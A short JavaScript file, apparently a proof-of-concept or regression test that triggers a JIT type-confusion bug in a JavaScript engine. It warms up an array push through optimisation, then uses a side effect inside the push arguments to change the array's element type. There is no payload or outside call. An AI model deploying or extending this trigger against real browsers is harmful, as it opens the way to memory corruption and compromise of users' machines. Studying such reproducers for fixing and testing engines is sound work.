let trigger = false;

function side_effect(the_array) {
    if (trigger) {
        the_array[0] = {};
    }
    return 1.1;
}

function vulnerable(the_array) {
    the_array.push(side_effect(the_array), 2.2);
}

for (let i = 0; i < 25000; ++i) {
    let arr = [1.1, 2.2, 3.3, 4.4];
    vulnerable(arr);
}

trigger = true;
let final_array = [1.1, 2.2, 3.3, 4.4];
vulnerable(final_array);